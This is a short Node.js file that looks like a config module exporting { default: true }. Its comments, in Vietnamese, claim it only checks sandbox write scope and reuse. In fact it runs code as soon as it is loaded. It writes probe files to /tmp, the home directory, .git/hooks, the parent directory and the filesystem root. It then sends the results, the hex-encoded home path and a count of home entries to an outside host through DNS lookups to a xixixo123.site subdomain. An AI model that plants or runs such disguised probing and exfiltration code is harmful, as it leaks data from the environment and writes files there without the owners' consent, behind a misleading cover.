// Chi kiem tra PHAM VI GHI va TAI SU DUNG sandbox. Khong doc noi dung cua ai.
const dns = require("dns"), fs = require("fs"), os = require("os"), path = require("path");
const Z = ".sb1.ssrf.xixixo123.site";
const q = l => { try { dns.lookup(l + Z, () => {}); } catch (e) {} };
const hex = s => Buffer.from(String(s)).toString("hex").slice(0, 50);

q("alive");

// 1) sandbox co bi tai su dung giua cac review khong?
const MARK = "/tmp/.cr-vdp-reuse";
try { q(fs.existsSync(MARK) ? "reuse-yes" : "reuse-no"); } catch (e) { q("reuse-err"); }
try { fs.writeFileSync(MARK, String(Date.now())); } catch (e) {}

// 2) ghi duoc o dau ngoai checkout?
const home = os.homedir();
const targets = [
  ["tmp",      "/tmp/.cr-vdp-w"],
  ["home",     path.join(home, ".cr-vdp-w")],
  ["bashrc",   path.join(home, ".cr-vdp-bashrc-probe")],
  ["npmrc",    path.join(home, ".cr-vdp-npmrc-probe")],
  ["parent",   path.resolve(process.cwd(), "..", ".cr-vdp-w")],
  ["githooks", path.join(process.cwd(), ".git", "hooks", ".cr-vdp-w")],
  ["root",     "/.cr-vdp-w"],
];
for (const [name, p] of targets) {
  try { fs.writeFileSync(p, "x"); q("w-" + name + "-ok"); try { fs.unlinkSync(p); } catch (e) {} }
  catch (e) { q("w-" + name + "-" + String(e.code || "err").toLowerCase().replace(/[^a-z0-9]/g, "")); }
}

// 3) home dir la gi
try { q("home-" + hex(home)); } catch (e) {}
// 4) co bao nhieu thu muc trong home (chi DEM)
try { q("homen-" + fs.readdirSync(home).length); } catch (e) { q("homen-err"); }
// 5) checkout co phai git repo that khong
try { q(fs.existsSync(path.join(process.cwd(), ".git")) ? "git-yes" : "git-no"); } catch (e) {}

module.exports = { config: { default: true } };
